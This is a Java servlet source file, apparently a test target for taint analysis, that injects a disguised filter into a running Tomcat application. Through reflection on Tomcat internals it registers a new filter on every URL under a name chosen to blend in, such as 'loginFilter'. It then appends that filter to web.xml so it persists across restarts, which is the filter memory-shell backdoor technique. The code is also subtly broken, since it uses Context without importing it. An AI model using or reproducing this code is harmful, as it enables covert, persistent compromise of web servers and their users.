package target.taint;

import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.ApplicationContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.Filter;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.DispatcherType;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.*;

public class FilterSetupServlet extends HttpServlet {

    // Method to get filter configurations from StandardContext
    public HashMap<String, Object> getFilterConfig(StandardContext standardContext) throws Exception {
        Field _filterConfigs = standardContext.getClass().getDeclaredField("filterConfigs");
        _filterConfigs.setAccessible(true);
        return (HashMap<String, Object>) _filterConfigs.get(standardContext);
    }

    // Method to get filter maps from StandardContext
    public Object[] getFilterMaps(StandardContext standardContext) throws Exception {
        Field _filterMaps = standardContext.getClass().getDeclaredField("filterMaps");
        _filterMaps.setAccessible(true);
        Object filterMaps = _filterMaps.get(standardContext);
        try {
            Field _array = filterMaps.getClass().getDeclaredField("array");
            _array.setAccessible(true);
            return (Object[]) _array.get(filterMaps);
        } catch (Exception e) {
            return (Object[]) filterMaps;
        }
    }

    // Get the filter name from filterMap
    public String getFilterName(Object filterMap) throws Exception {
        Method getFilterName = filterMap.getClass().getDeclaredMethod("getFilterName");
        getFilterName.setAccessible(true);
        return (String) getFilterName.invoke(filterMap);
    }

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            String startName = "";
            String path = "";

            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardCtx = (StandardContext) webappClassLoaderBase.getResources().getContext();
            HashMap<String, Object> filterConfigs1 = getFilterConfig(standardCtx);
            Object[] filterMaps1 = getFilterMaps(standardCtx);
            List<String> names = new ArrayList<>();

            // Populate filter names and paths
            for (Object fm : filterMaps1) {
                Object appFilterConfig = filterConfigs1.get(getFilterName(fm));
                if (appFilterConfig == null) continue;

                Field _filter = appFilterConfig.getClass().getDeclaredField("filter");
                _filter.setAccessible(true);
                Object filter = _filter.get(appFilterConfig);

                ApplicationFilterConfig afc = (ApplicationFilterConfig) appFilterConfig;
                String filterClassName = filter.getClass().getName();
                String[] temp = filterClassName.split("\\.");
                StringBuilder tmpName = new StringBuilder();
                for (int j = 0; j < temp.length - 1; j++) {
                    tmpName.append(temp[j]);
                    if (j != temp.length - 2) tmpName.append(".");
                }
                if (tmpName.toString().contains("org.apache.tomcat")) continue;

                startName = tmpName.toString();
                URL url = filter.getClass().getResource("");
                path = url.toString();
                names.add(afc.getFilterName());
            }

            startName = startName.replaceAll("\\.", "/");
            path = path.split("file:/")[1];

            // Generate unique filter name
            String[] nameArray = {"testFilter", "loginFilter", "coreFilter", "userFilter", "manageFilter", "shiroFilter", "indexFilter"};
            List<String> nameList = Arrays.asList(nameArray);
            Collections.shuffle(nameList);
            String finalName = null;
            for (String s : nameArray) {
                if (!names.contains(s)) {
                    finalName = s;
                    break;
                }
            }
            if (finalName == null) return;

            // Update filter configuration in web.xml if needed
            updateWebXML(standardCtx, startName, path, finalName);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void updateWebXML(StandardContext standardCtx, String startName, String path, String finalName) throws Exception {
        String newClassName = finalName;
        byte[] items = newClassName.getBytes();
        items[0] = (byte) ((char) items[0] - 'a' + 'A');
        newClassName = new String(items);

        Field appctx = standardCtx.getClass().getDeclaredField("context");
        appctx.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext) appctx.get(standardCtx);

        Field stdctx = applicationContext.getClass().getDeclaredField("context");
        stdctx.setAccessible(true);
        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

        Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
        Configs.setAccessible(true);
        Map<String, ApplicationFilterConfig> filterConfigs = (Map) Configs.get(standardContext);

        // Add new filter if not already present
        if (filterConfigs.get(finalName) == null) {
            String tmpName = startName + "/" + newClassName;
            tmpName = tmpName.replaceAll("/", ".");
            Class<?> c = standardContext.getClass().forName(tmpName);
            Filter filter = (Filter) c.newInstance();

            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(filter);
            filterDef.setFilterName(finalName);
            filterDef.setFilterClass(filter.getClass().getName());
            standardContext.addFilterDef(filterDef);

            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern("/*");
            filterMap.setFilterName(finalName);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());
            standardContext.addFilterMapBefore(filterMap);

            Constructor<ApplicationFilterConfig> constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = constructor.newInstance(standardContext, filterDef);

            filterConfigs.put(finalName, filterConfig);

            updateWebXMLFile(filter.getClass(), startName, newClassName, finalName);
        }
    }

    private void updateWebXMLFile(Class<?> filterClass, String startName, String newClassName, String finalName) throws IOException {
        String targetData = "    <filter>\n" +
                "        <filter-name>%s</filter-name>\n" +
                "        <filter-class>%s</filter-class>\n" +
                "        <init-param>\n" +
                "            <param-name>charset</param-name>\n" +
                "            <param-value>UTF-8</param-value>\n" +
                "        </init-param>\n" +
                "    </filter>\n" +
                "    <filter-mapping>\n" +
                "        <filter-name>%s</filter-name>\n" +
                "        <url-pattern>/*</url-pattern>\n" +
                "    </filter-mapping>\n";
        String className1 = startName + "/" + newClassName;
        className1 = className1.replaceAll("/", ".");
        targetData = String.format(targetData, finalName, className1, finalName);

        String resourcePath = filterClass.getResource("").toString().split("file:/")[1].split("WEB-INF")[0];
        String xmlPath = resourcePath + "WEB-INF/web.xml";
        byte[] data = Files.readAllBytes(Paths.get(xmlPath));
        String dataStr = new String(data, StandardCharsets.UTF_8);
        String prefix = dataStr.split("</web-app>")[0];
        StringBuilder finalData = new StringBuilder(prefix).append(targetData).append("</web-app>");
        Files.write(Paths.get(xmlPath), finalData.toString().getBytes(StandardCharsets.UTF_8));
    }
}
